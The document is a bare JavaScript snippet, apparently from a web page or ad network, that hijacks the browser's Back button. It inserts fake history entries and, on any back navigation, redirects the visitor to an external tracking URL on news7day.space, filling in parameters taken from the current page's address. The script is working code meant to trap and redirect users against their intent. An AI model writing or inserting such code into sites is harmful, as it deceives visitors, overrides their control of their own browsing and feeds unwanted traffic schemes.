!(function () {
    const depth = 2,
        getUrl = function () {
            return 'https://news7day.space/vt/external/6130a03514803.html?stream_uuid=55ff1982-dd78-44b7-8835-b06530a17d15&utm_term=174';
        },
        replaceMacros = function (backLink) {
            const DefaultMacroValue = '',
                regExp = /\[(.+?)]/g;

            try {
                var url = new URL(location.href);

                backLink = backLink.replace(regExp, function (all, key) {
                    if (url.searchParams.has(key)) {
                        return url.searchParams.get(key);
                    }
                    return DefaultMacroValue;
                });

                return backLink;
            } catch (err) {
                console.error(err);
                return backLink;
            }
        };

    var disabled = false;
                
    try {
        if (disabled === true) {
                        history.go(-depth);
            return;
        }

        const URL = window.location.href.split(/[#]/)[0];
        for (let t = 0; depth > t; ++t) history.pushState({}, '', URL + '#' + t);

        onpopstate = (event) => {
            if (disabled === false) {
                event.state && location.replace(replaceMacros(getUrl()));
            }
        };
    } catch (err) {
        console.log(err);
    }
})();
